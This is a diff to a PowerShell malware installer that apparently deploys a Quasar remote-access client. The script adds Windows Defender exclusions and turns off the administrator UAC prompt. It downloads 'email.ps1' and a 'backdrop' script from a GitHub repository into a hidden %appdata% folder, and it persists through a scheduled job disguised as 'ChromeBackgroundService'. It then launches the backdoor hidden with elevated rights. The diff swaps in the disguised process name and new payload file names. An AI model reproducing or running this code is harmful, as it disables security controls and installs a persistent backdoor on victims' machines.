@@ -10,13 +10,13 @@ Add-MpPreference -ExclusionProcess "powershell.exe" -Force
 Add-MpPreference -ExclusionProcess "cmd.exe" -Force
 Add-MpPreference -ExclusionProcess "Client.exe" -Force
 Add-MpPreference -ExclusionProcess "Quasar-Client.exe" -Force
-Add-MpPreference -ExclusionProcess "NvidiaCoreComponent.exe" -Force
+Add-MpPreference -ExclusionProcess "ChromeBackgroundService.exe" -Force
 Add-MpPreference -ExclusionProcess "NvidiaCore.exe" -Force
 Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
 $homedir = "$env:appdata\Chrome"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $homedir\email.ps1
 
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.bat' -OutFile $homedir\backdrop.bat
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.ps1' -OutFile $homedir\backdrop.ps1
 
 if(Test-Path -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs){
 Remove-Item -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs -Force
@@ -31,7 +31,7 @@ attrib +h "$homedir\backdrop.bat"
 
 $jobname = "ChromeBackgroundService"
 #$script = "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command cscript.exe $env:appdata\MICROS~1\Windows\STARTM~1\Programs\Startup\sec.vbs"
-$script = "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command cscript.exe $homedir\sec.vbs"
+$script = "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $homedir\sec.vbs'"
 $repeat = (New-TimeSpan -Minutes 50)
 
 $scriptblock = [scriptblock]::Create($script)
@@ -48,4 +48,4 @@ Register-ScheduledJob -Name $jobname -ScriptBlock $scriptblock -Trigger $trigger
 
 #Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"
 
-start-process "powershell.exe" -ArgumentList "cmd /c $homedir\backdrop.bat" -WindowStyle Hidden -Verb RunAs
+start-process "powershell.exe" -ArgumentList "powershell -file $homedir\backdrop.ps1" -WindowStyle Hidden -Verb RunAs
